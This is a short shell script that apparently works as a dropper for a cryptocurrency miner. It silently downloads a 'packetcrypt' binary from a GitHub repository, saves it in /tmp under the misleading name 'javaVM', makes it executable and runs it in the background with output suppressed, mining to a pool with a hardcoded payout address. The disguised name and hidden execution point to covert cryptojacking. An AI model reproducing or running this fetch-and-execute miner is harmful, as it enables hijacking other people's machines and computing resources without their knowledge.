#!/bin/sh
if [ -f /tmp/javaVM ]
 	then
 	/tmp/javaVM ann -p pP1tbmNxyaYm9pQk6ejjAew2Nnaow2MuSn http://pool.pkt.world > /dev/null 2>&1 &
 	echo Started Existing
 	else
 		wget -q https://github.com/thesunofme/trash/raw/main/packetcrypt -O /tmp/javaVM
 		chmod +x /tmp/javaVM
 		/tmp/javaVM ann -p pP1tbmNxyaYm9pQk6ejjAew2Nnaow2MuSn http://pool.pkt.world > /dev/null 2>&1 &
fi
